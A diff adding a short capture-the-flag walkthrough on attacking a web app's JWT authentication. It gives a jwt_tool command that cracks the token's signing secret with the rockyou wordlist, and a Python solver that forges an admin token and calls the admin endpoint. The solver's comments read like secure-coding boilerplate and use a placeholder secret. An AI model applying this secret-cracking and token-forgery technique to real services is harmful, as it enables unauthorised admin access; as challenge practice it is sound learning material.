@@ -1,0 +1,36 @@
+Now check /js/app.d875ddd5.js.map
+
+Open web dev tools from Chrome/Firefox and extract from local storage data about your user
+
+python3 jwt_tool.py -t http://35.198.93.134:30791/api/app/admin -rc
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImlhdCI6MTYzNTkzNjY4OCwiZ
+XhwIjoxNjM2MDIzMDg4fQ.tQ2KlBU8tI5V1Akiqhwy2LSEOF9oBTvnYFs_xgwro04" -C -d
+~/rockyou.txt
+
+Use burp to cache request from “Admin Board”
+
+If we add the ROLE_ADMIN role to the current user, we notice a new button in the navigation
+bar that leads to a page that makes a request to / api / app / admin. The only parameter passed
+to this endpoint is a JWT token, which is actually a server-signed object with a password.
+
+solver.py
+
+import requests
+import jwt
+import time
+
+url = "http://35.198.135.192:31619/api/app/admin"
+
+# Set the secret key to a strong, secure value
+secret_key = "your_secure_secret_key"
+
+# Set the expiration time to a reasonable duration (e.g., 1 hour from now)
+expiration_time = int(time.time()) + 3600  # 3600 seconds = 1 hour
+
+payload = {"id": 1, "iat": int(time.time()), "exp": expiration_time}
+token = jwt.encode(payload, secret_key, algorithm='HS256')
+
+print(token)
+r = requests.get(url, headers={"x-access-token": token})
+
+print(r.text)
